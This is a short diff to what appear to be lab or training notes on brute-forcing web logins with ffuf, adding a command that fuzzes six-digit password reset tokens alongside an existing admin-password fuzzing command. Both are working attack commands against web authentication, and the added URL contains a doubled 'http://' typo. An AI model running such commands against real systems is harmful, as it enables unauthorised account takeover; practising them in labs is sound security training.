@@ -22,3 +22,8 @@ ffuf -w ./custom_wordlist.txt -u http://94.237.57.154:37595/index.php -X POST -H
 pplication/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username or password."
 ```
 
+# Brute-Forcing Password Reset Tokens
+
+```bash
+ffuf -w /usr/share/seclists/Fuzzing/6-digits-000000-999999.txt -u http://http://83.136.254.47:36180/reset_password.php?token=FUZZ -fr "The provided token is invalid"
+```
